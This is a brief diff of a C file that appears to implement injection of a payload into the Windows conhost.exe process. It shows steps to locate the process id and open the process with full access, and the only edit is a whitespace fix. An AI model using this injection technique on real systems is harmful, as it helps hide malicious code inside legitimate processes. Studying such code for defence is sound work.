@@ -144,7 +144,7 @@ VOID conhostInject(LPVOID payload, DWORD payloadSize) {
 
     // 2. Obtain the process id for the host process 
     pid = conhostId(ppid);
-    
+
     // 3. Open the conhost.exe process
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
